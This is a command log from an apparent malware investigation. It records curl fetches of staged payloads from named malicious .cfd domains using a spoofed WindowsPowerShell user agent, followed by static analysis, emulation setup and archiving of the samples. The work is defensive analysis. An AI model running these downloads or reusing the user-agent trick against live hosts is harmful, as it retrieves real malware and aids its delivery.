# Command log

Representative commands run during the investigation (personal paths generalized to `$HOME`/`$SCRATCH`). Not an exhaustive log of every tool call, just the ones marking each meaningful step.

## Reproducing the infection chain (read-only, nothing executed)

```bash
# Stage 1 — plain UA gets redirected (301), not the real payload
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -s "http://dragonphoenixstar.cfd/<stage1-token>" -o payload.txt

# Stage 1 — UA with WindowsPowerShell/5.1 suffix succeeds
curl -s -L -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; WindowsPowerShell/5.1)" "http://dragonphoenixstar.cfd/<stage1-token>" -o payload.txt

# Stage 2 (fetched the same way, from the URL payload.txt points to)
curl -s -L -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) WindowsPowerShell/5.1" "http://dragonphoenixstar.cfd/<stage2-token>" -o stage2.txt

# Extract IOCs directly from the real dropper script instead of guessing
grep -iE 'https?://[^\s"'"'"']+' stage2.txt
grep -iE '(\$pw|password)' stage2.txt

# Download the real delivered archive (never extracted outside an isolated VM)
curl -s -L -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) WindowsPowerShell/5.1" "http://sillygoosetoon.cfd/dl/689838.7z" -o malpack.7z
file malpack.7z
```

## Static analysis of the original binary

```bash
strings -a -n 6 /tmp/malware_extract/shahradr.exe > /tmp/all_strings.txt
objdump -h /tmp/malware_extract/shahradr.exe
objdump -d --no-show-raw-insn /tmp/malware_extract/shahradr.exe | head -n 100
```

## Truncating the binary for analysis

```bash
dd if=/tmp/malware_extract/shahradr.exe of=/tmp/shahradr_clean.exe bs=1M count=5
```

## Emulation environment

```bash
python3 -m venv $SCRATCH/malware_venv
source $SCRATCH/malware_venv/bin/activate
pip install speakeasy-emulator unicorn==1.0.2 capstone pefile lief pycryptodome setuptools
```

## Headless static analysis with rizin / Ghidra

```bash
RZ=/tmp/squashfs-root/usr/bin/rizin
export LD_LIBRARY_PATH=/tmp/squashfs-root/usr/lib:$LD_LIBRARY_PATH
export SLEIGHHOME=/tmp/squashfs-root/usr/lib/rizin/plugins/rz_ghidra_sleigh

# Disassemble at a specific address
$RZ -q -c "pd 40 @ 0x1400123b0" /tmp/shahradr_clean.exe

# Decompile with the Ghidra plugin
$RZ -q -c "aa; s 0x140012470; pdg" /tmp/shahradr_clean.exe
```

## Running the emulation script (iterative)

```bash
source $SCRATCH/malware_venv/bin/activate
python3 $SCRATCH/unpack_shahradr.py
```

## Extracting strings from the unpacked payload

```bash
strings -n 5 /tmp/payload_unpacked.exe | head -100
strings -e l /tmp/payload_unpacked.exe   # UTF-16LE
```

## Building the encrypted evidence bundle for this repo

```bash
7z a -mhe=on -mx=9 -p'infected' samples/malware-samples-PROTECTED.7z \
  malpack.7z shahradr_clean.exe payload_unpacked.exe
sha256sum shahradr.exe shahradr_clean.exe payload_unpacked.exe malpack.7z
```
